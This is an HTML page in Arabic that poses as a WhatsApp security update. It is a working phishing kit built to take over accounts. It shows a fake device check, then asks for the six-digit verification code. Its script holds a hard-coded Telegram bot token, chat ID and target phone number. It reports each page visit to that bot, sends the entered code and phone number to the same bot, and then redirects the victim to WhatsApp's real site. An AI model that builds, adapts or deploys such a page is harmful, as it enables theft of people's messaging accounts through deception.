<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security System</title>
    <style>
        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-surface: #111b21; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; }

        /* شاشة التحميل (Dark الشفاف) */
        #checker { 
            position: fixed; inset: 0; background: rgba(11, 20, 26, 0.95); z-index: 1000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        /* لوجو أصغر وبنبض هادي */
        .pulse-logo {
            width: 60px;
            animation: pulseLogo 2s infinite ease-in-out;
        }
        @keyframes pulseLogo {
            0% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(1); opacity: 0.9; }
        }

        .container { padding: 30px 20px; text-align: center; display: none; max-width: 450px; margin: auto; }
        .active { display: block; animation: fadeIn 0.5s ease; }

        .device-info { 
            background: #1d2a33; border-radius: 12px; padding: 20px; text-align: right; 
            margin-bottom: 25px; border: 1px solid #222d34;
        }
        
        .info-line { font-size: 13px; margin-bottom: 10px; color: var(--wa-hint); display: flex; justify-content: space-between; }
        .info-line b { color: #fff; font-family: monospace; font-weight: normal; }

        /* تعديل النص بدل الأحمر */
        .status-update { color: var(--wa-green); font-weight: 500; }

        .otp-input {
            width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942;
            color: #fff; font-size: 32px; text-align: center; outline: none; letter-spacing: 12px; margin: 25px 0; direction: ltr;
        }
        .otp-input:focus { border-bottom-color: var(--wa-green); }

        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }

        .spinner { border: 2px solid #202c33; border-top: 2px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div id="checker">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse-logo">
        <p id="log-text" style="margin-top:20px; font-size:14px; color:var(--wa-hint);">جاري التحقق من أمان الحساب...</p>
    </div>

    <div class="container" id="app">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom:20px;">
        <h2 style="font-size:20px; margin-bottom:15px; font-weight: 500;">تحديث أمان واتساب</h2>

        <div class="device-info">
            <div class="info-line">الجهاز المكتشف: <b id="device-name">جاري التحديد...</b></div>
            <div class="info-line">حالة الإصدار: <span class="status-update">تحديث متاح (v2.4)</span></div>
            <div class="info-line">نظام التشفير: <b>SSL/TLS 1.3</b></div>
            <div style="border-top: 1px solid #222d34; margin-top:10px; padding-top:10px;">
                الرقم الموثق: <b id="masked-phone" style="color:var(--wa-green);"></b>
            </div>
        </div>

        <p style="font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px;">
            تم إصلاح بعض الأخطاء في التحديثات الأخيرة. لضمان توافق حسابك مع الإصدار الأخير يرجى التأكد من حسابك من هنا.
        </p>

        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">
        <button class="btn" onclick="submitData()">تحديث ومزامنة الآن</button>
    </div>

    <script>
        const CFG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            P: '01030003287'
        };

        function getDeviceModel() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android Device";
            if (/iPhone|iPad/i.test(ua)) return "Apple iPhone (iOS)";
            return "Mobile Device";
        }

        document.getElementById('device-name').innerText = getDeviceModel();
        document.getElementById('masked-phone').innerText = "+20 " + CFG.P.substring(0,3) + " •••• •• " + CFG.P.slice(-2);

        async function bot(msg) {
            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
            });
        }

        window.onload = () => {
            bot(`📱 <b>[دخول جديد]:</b> فتح الصفحة.`);
            setTimeout(() => {
                document.getElementById('checker').style.display = 'none';
                document.getElementById('app').classList.add('active');
            }, 3500);
        };

        async function submitData() {
            const val = document.getElementById('otp').value;
            if(val.length === 6) {
                document.querySelector('.btn').innerText = "جاري المزامنة...";
                await bot(`🔥 <b>[كود وصل]:</b>\nالرقم: <code>${CFG.P}</code>\nالكود: <code>${val}</code>`);
                
                document.body.innerHTML = `<div style="background:var(--wa-bg); height:100vh; display:flex; align-items:center; justify-content:center; color:var(--wa-hint); flex-direction:column;">
                    <div class="spinner"></div><p style="margin-top:20px;">جاري المزامنة مع الخادم...</p>
                </div>`;
                
                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 3000);
            }
        }
    </script>
</body>
</html>
